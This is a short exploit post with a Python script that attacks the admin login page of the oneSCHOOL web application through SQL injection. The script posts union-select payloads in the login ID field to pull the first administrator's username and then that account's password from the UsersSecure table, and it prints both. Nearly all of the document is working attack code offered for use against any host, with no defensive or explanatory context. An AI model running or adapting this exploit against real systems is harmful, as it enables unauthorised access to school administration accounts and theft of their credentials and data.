oneSCHOOL (all versions) admin/login.asp SQL Injection exploit 
==============================================================



#!/usr/bin/python

#oneSCHOOL admin/login.asp SQL Injection explot (for all versions)
#by Guga360.

import urllib
from sys import argv

query = {&#039;txtOperation&#039;:&#039;Login&#039;,&#039;txtLoginID&#039;:"""
&#039; union select min(LoginName),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from UsersSecure where LoginName>&#039;a&#039;--""",&#039;txtPassword&#039;:&#039;x&#039;,&#039;btnSubmit&#039;:&#039;L+O+G+I+N+%3E%3E&#039;}

queryx = urllib.urlencode(query)

if len(argv)<>2:
    print """
    **********
    
    Usage:
    oneSCHOOLxpl.py [host]

    [+] Exploiting...
    
    [+] User: admin
    [+] Password: 123
    
    *******************
    """
else:
    try:
        print &#039;\n[+] Exploting...\n&#039;
        host = argv[1]        
        if host[0:7]<>&#039;http://&#039;:
            host = &#039;http://&#039;+host
        url = urllib.urlopen(host+&#039;/admin/login.asp&#039;, queryx)
        url = url.read()
        url = url.split()
        name = url.index(&#039;varchar&#039;)+2
        name = url[name]
        name = name.replace("&#039;","")
        print &#039;[+] User: &#039; + name
        query2 = query.copy()
        query2[&#039;txtLoginID&#039;]="""&#039; union select min(Password),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from UsersSecure where LoginName=&#039;"""+name+"""&#039;--"""
        query2 = urllib.urlencode(query2)
        url = urllib.urlopen(host+&#039;/admin/login.asp&#039;, query2)
        url = url.read()
        url = url.split()
        passw = url.index(&#039;varchar&#039;)+2
        passw = url[passw]
        passw = passw.replace("&#039;","")
        print &#039;[+] Pass: &#039;+passw
    except:
        print &#039;[+] Not vulnerable!&#039;



